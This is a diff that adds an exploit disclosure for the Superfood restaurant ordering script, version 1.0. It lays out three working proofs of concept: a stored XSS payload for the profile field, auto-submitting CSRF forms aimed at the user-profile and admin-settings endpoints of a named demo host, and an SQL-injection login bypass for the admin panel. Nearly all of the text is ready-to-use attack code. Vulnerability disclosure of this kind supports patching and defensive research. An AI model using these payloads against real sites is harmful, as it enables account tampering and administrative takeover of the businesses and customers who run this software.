@@ -1,0 +1,57 @@
+# Exploit Title:  Superfood - Restaurants & Online Food Order System  1.0 - Persistent cross site scripting / Cross site request forgery / Admin panel Authentication bypass
+# Date: 2018-05-20
+# Exploit Author: Borna nematzadeh (L0RD) or borna.nematzadeh123@gmail.com
+# Vendor Homepage: https://codecanyon.net/item/superfood-restaurants-online-food-order-system/16855836?s_rank=30
+# Version: 1.0
+# Tested on: Kali linux
+====================================================
+# Description:
+Superfood - Restaurants & Online Food Order System 1.0 suffers from multiple vulnerabilities :
+====================================================
+# POC 1 : Persistent cross site scripting :
+1) After creating an account , go to your profile.
+2) Navigate to "Update profile" and put this payload :
+"/><script>alert('xss')</script>
+3) You will have an alert box in the page .
+====================================================
+# POC 2 : CSRF :
+Attacker can change user's authentication directly :
+# User's CSRF exploit :
+<html>
+<head>
+    <title>CSRF POC</title>
+</head>
+<body>
+    <form action="http://restaurant.thesoftking.com/updateprofile"
+method="post">
+        <input type="hidden" name="name" value="anything">
+        <input type="hidden" name="mobile" value="1000000000">
+        <input type="hidden" name="address" value="anything">
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+</body>
+</html>
+
+# Admin page CSRF exploit :
+
+<form action="http://restaurant.thesoftking.com/admin/setgeneral.php"
+method="post">
+        <input name="name" value="exploit" type="hidden">
+        <input name="wcmsg" value="test" type="hidden">
+        <input name="address" value="test2" type="hidden">
+        <input name="mobile" value="1000000" type="hidden">
+        <input name="email" value="test@test.com" type="hidden">
+        <input name="currency" value="decode" type="hidden">
+</form>
+    <script>
+         document.forms[0].submit();
+    </script>
+====================================================
+# POC 3 : Authentication bypass :
+# Attacker can bypass admin panel without any authentication :
+Path : /admin
+Username : ' or 0=0 #
+Password : anything
+====================================================
